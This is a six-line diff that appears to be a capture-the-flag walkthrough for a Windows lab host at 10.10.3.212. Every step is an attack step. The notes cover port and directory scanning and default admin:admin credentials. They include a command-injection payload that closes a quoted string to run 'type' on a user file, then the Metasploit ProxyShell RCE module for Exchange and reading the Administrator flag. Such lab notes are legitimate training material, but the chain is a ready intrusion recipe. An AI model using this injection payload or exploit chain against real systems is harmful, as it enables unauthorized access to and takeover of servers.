@@ -1,0 +1,6 @@
+1 - nmap -A 10.10.3.212
+2 - gobuster dir -k -u https://10.10.3.212 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 0
+3 - http://10.10.3.212/test (admin:admin)
+4 - BitlockerActiveMonitoringLogs'); type C:\Users\dev\Desktop\user.txt #('
+5 - msfconsole -> use exploit/windows/http/exchange_proxyshell_rce
+6 - shell -> type C:\Users\Administrator\Documents\flag.txt
